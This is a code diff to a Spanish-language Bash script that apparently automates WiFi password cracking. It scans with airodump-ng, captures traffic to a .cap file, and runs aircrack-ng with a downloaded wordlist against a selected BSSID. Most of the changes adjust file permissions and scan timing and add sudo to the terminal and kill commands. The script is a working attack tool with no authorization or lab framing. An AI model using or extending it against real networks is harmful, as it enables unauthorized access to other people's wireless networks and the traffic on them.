@@ -29,41 +29,47 @@ install_dependencies() {
     dialog --title "Dependencias" --msgbox "Todas las dependencias están instaladas." 8 40
 }
 
-# Crear carpetas del proyecto
+# Crear carpetas del proyecto con permisos correctos
 prepare_project_directory() {
     mkdir -p "$PROJECT_DIR" "$RESULTS_DIR" 2>/dev/null
-    sudo chmod -R 777 "$PROJECT_DIR" "$RESULTS_DIR" # Asignar permisos completos
+    chmod -R 755 "$DOWNLOADS_DIR" "$PROJECT_DIR" "$RESULTS_DIR"
+    if [[ ! -w "$RESULTS_DIR" ]]; then
+        dialog --title "Error de Permisos" --msgbox "No se pueden escribir archivos en $RESULTS_DIR. Verifique los permisos." 8 40
+        exit 1
+    fi
+}
+
+# Detectar interfaz inalámbrica
+detect_wireless_interface() {
+    local interface=$(iw dev | grep Interface | awk '{print $2}' | head -n 1)
+    if [[ -z "$interface" ]]; then
+        dialog --title "Error" --msgbox "No se detectó ninguna interfaz inalámbrica. Verifique su hardware." 8 40
+        exit 1
+    fi
+    echo "$interface"
 }
 
 # Escaneo en vivo de redes WiFi
 live_scan_networks() {
     local interface=$(detect_wireless_interface)
-    if [[ -z "$interface" ]]; then
-        dialog --title "Error" --msgbox "No se encontró ninguna interfaz inalámbrica. Asegúrese de que el adaptador esté conectado." 8 40
-        return
-    fi
-
     dialog --title "Escaneo en Vivo" --infobox "Escaneando redes en tiempo real..." 8 40
-    xterm -geometry 80x24+0+0 -hold -e "airodump-ng $interface --output-format cap --write $RESULTS_DIR/live_scan" &
-    sleep 10
-    killall airodump-ng
+
+    sudo xterm -geometry 80x24+0+0 -hold -e "airodump-ng $interface --output-format cap --write $RESULTS_DIR/live_scan" &
+    sleep 60
+    sudo killall airodump-ng
 
     if [[ ! -f "$RESULTS_DIR/live_scan-01.cap" ]]; then
-        dialog --title "Error" --msgbox "El archivo live_scan-01.cap no se generó. Verifica el proceso de escaneo." 8 40
-        return
+        dialog --title "Error" --msgbox "El archivo live_scan-01.cap no se generó. Verifique los permisos y el proceso de escaneo." 8 40
+        exit 1
+    else
+        chmod 644 "$RESULTS_DIR/live_scan-01.cap"
+        dialog --title "Éxito" --msgbox "El archivo live_scan-01.cap se generó correctamente." 8 40
     fi
-
-    show_scan_results "$RESULTS_DIR/live_scan-01.cap"
-}
-
-# Detectar interfaz inalámbrica
-detect_wireless_interface() {
-    iw dev | grep Interface | awk '{print $2}' | head -n 1
 }
 
 # Mostrar resultados del escaneo en vivo
 show_scan_results() {
-    local scan_file=$1
+    local scan_file="$RESULTS_DIR/live_scan-01.cap"
     if [[ -f "$scan_file" ]]; then
         parse_and_display_networks "$scan_file"
     else
@@ -76,6 +82,7 @@ parse_and_display_networks() {
     local scan_file=$1
     local networks=()
 
+    sudo chmod 644 "$scan_file"
     while IFS=, read -r bssid pwr beacons data mb enc cipher auth essid; do
         if [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
             local color="$NC"
@@ -120,7 +127,7 @@ perform_attack() {
     local dictionary=$(find_or_download_dictionary)
 
     dialog --title "Ataque" --infobox "Iniciando ataque contra $bssid..." 8 40
-    xterm -geometry 80x24+0+0 -hold -e "aircrack-ng -w $dictionary -b $bssid $RESULTS_DIR/live_scan-01.cap" &
+    sudo xterm -geometry 80x24+0+0 -hold -e "aircrack-ng -w $dictionary -b $bssid $RESULTS_DIR/live_scan-01.cap" &
 }
 
 # Buscar o descargar diccionario rockyou.txt
